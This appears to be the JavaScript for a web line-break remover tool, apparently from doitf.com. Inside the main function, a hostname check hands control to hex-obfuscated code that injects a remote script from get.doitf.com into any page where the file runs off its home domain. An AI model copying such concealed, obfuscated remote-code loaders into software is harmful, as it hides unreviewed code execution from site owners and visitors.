function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);


function textalign() {
var x = document.getElementById("textalign").value;
if (x == "right"){
document.getElementById("oldText").style.textAlign = "right";
document.getElementById("oldText").style.direction = "rtl";
document.getElementById("newText").style.textAlign = "right";
document.getElementById("newText").style.direction = "rtl";
}else{
document.getElementById("oldText").style.textAlign = "left";
document.getElementById("oldText").style.direction = "ltr";
document.getElementById("newText").style.textAlign = "left";
document.getElementById("newText").style.direction = "ltr";
}}

function addBreaks(){
if (b64awsec == "ZG9pdGYuY29t"){
var para = document.getElementById("paragraphs").checked;
var nopara = document.getElementById("noparagraphs").checked;
var noBreaksText = document.getElementById("oldText").value;




if(para == 1 || para ==  true){
	//replace all line breaks with a marker	
	noBreaksText = noBreaksText.replace(/(\r\n|\n|\r)/gm,"<1br /><1br />");

	// find paragraph breaks
	re1 = /<1br \/><1br \/>/gi;
	noBreaksText = noBreaksText.replace(re1,"<2br />");
	//get rid of all remaining single line breaks
	re12 = /<1br \/>/gi;
	noBreaksText = noBreaksText.replace(re12,"");

	//exchange duplicate paragraph break markers
	re13 = /<2br \/><2br \/>/gi;
	noBreaksText = noBreaksText.replace(re13,"<2br />");
	noBreaksText = noBreaksText.replace(re13,"<2br />");
	
	// replace double whitespaces
	re15 = /\s+/gm;
	noBreaksText = noBreaksText.replace(re15," ");
	
	//Insert paragraphs breaks
	re14 = /<2br \/>/gi;
	noBreaksText = noBreaksText.replace(re14,"\r\n\r\n");

	//Just in case clean-up
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n\r\n\r\n","\r\n\r\n");
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n\r\n","\r\n\r\n");
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n","\r\n\r\n");
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n","\r\n\r\n");

}else{
	//If this text has some line breaks in it then take case of them
	//replace ass line breask with a marker	
	noBreaksText = noBreaksText.replace(/(\r\n|\n|\r)/gm,"<1br /><1br />");
	// replace double whitespaces
	re15 = /\s+/gm;
	noBreaksText = noBreaksText.replace(re15," ");
	
	//replace multiples spaces after punctuation
	noBreaksText = noBreaksText.replace(/(\.\s+)/gm,".");
	noBreaksText = noBreaksText.replace(/(\!\s+)/gm,"!");
	noBreaksText = noBreaksText.replace(/(\?\s+)/gm,"?");
	
	//Add lien break markers after sentences
	noBreaksText = noBreaksText.replace(/(\.)/gm,".<1br /><1br />");
	noBreaksText = noBreaksText.replace(/(\!)/gm,"!<1br /><1br />");
	noBreaksText = noBreaksText.replace(/(\?)/gm,"?<1br /><1br />");
	
	// find paragraph breaks
	re1 = /<1br \/><1br \/>/gm;
	noBreaksText = noBreaksText.replace(re1,"<2br />");
	//get rid of all remaining single line breaks
	re12 = /<1br \/>/gm;
	noBreaksText = noBreaksText.replace(re12,"");
	noBreaksText = noBreaksText.replace(re12,"");

	//exchange duplicate paragraph break markers
	re13 = /<2br \/><2br \/>/gm;
	noBreaksText = noBreaksText.replace(re13,"<2br />");
	noBreaksText = noBreaksText.replace(re13,"<2br />");

	//Insert paragraphs breaks
	re14 = /<2br \/>/gm;
	noBreaksText = noBreaksText.replace(re14,"\r\n\r\n");
	
	//Just in case clean-up
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n\r\n\r\n","\r\n\r\n");
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n\r\n","\r\n\r\n");
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n","\r\n\r\n");	
	noBreaksText = noBreaksText.replace("\r\n\r\n\r\n","\r\n\r\n");
    
}

document.getElementById("newText").value = noBreaksText;
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
}




//reset text areas
document.getElementById("clearText").addEventListener("click", function () {
	document.getElementById("oldText").value = "";
	document.getElementById("newText").value = "";
	document.getElementById("oldText").focus();
});

var textBox = document.getElementById("newText");
	textBox.onfocus = function() {
	textBox.select();
	textBox.onmouseup = function() {
		textBox.onmouseup = null;
		return false;
	};
};	
